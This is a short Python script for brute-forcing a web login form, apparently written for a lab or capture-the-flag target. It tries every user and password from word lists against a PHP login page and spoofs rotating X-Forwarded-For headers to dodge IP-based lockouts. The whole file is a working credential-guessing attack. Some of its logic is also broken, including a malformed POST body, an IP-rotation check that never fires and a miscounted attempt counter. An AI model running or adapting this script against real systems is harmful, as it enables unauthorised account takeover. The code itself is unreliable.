## Mostly, a template for something similar.

## Lame user/password login form brute forcer. Loads word lists from files.
## (X-Forwarded-For might bypass something to trick the server)



import httplib2
import time

passwords=set()
with open('passes.txt') as f:
    for line in f:
      passwords.add(line.rstrip('\n'))

users = set()
with open('users.txt') as f:
  for line in f:
    users.add(line.rstrip('\n'))


print('------')

h = httplib2.Http()

count = 0
ip = 1
ip2 = 1
for user in users:
  for candidate in passwords:
#    if ((count % 10) == 0): 
    print("still working.. (" + user + "/" + candidate + ")")
    time.sleep(0.05)
    (resp, content) = h.request("http://10.10.XX.XX/REDACTED.php",
                                "POST", body="username=&" + user + "&password=" + candidate,
                                headers={'Content-Type':'application/x-www-form-urlencoded',
                                         'X-Forwarded-For':'10.15.' + str(ip) + '.' + str(ip2),
                                         'Cookie': 'PHPSESSID=ROTSESSION'} )

    if (not ('Incorrect username or password' in content)):
      print("FINALLY!! " + candidate)
      print(str(count) + " attempts done")
      print("--------")
      print(resp)
      print("--------")
      print(content)
      exit(0)
    
    ip = ip +1
    if ((ip % 255) == 255):
      ip = 1
      ip2 = ip2 + 1
  count = count + 1

print("the end.. that's all folks")    
